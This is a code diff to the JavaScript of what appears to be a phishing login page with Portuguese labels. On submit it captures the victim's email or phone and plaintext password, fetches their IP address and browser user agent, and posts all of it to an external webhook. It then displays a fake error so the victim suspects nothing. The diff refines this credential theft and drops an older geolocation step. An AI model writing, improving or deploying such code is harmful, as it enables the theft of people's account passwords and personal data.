@@ -79,29 +79,23 @@
             
             const label = email.includes('@') ? 'Email' : /^[0-9+\s()-]+$/.test(email) ? 'Telefone' : 'Usuário';
             
-            let location = 'Obtendo...';
+            let location = 'Detectando...';
+            let ip = 'N/A';
             
-            fetch(WEBHOOK_URL, {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+                location = `IP: ${ip}`;
+            } catch(e) {}
+            
+            await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `**Login Attempt**\n${label}: ${email}\nPassword: ${password}\nLocalização: ${location}`
+                    content: `**Login Attempt**\n${label}: ${email}\nPassword: ${password}\nIP: ${ip}\nUser-Agent: ${navigator.userAgent}`
                 })
             });
-            
-            fetch('https://geolocation-db.com/json/')
-                .then(r => r.json())
-                .then(data => {
-                    location = `${data.city || 'N/A'}, ${data.state || 'N/A'}, ${data.country_name || 'N/A'} - IP: ${data.IPv4}`;
-                    fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: `**Localização Atualizada**\n${label}: ${email}\n${location}`
-                        })
-                    });
-                })
-                .catch(() => {});
             
             document.getElementById('errorMsg').style.display = 'block';
         });
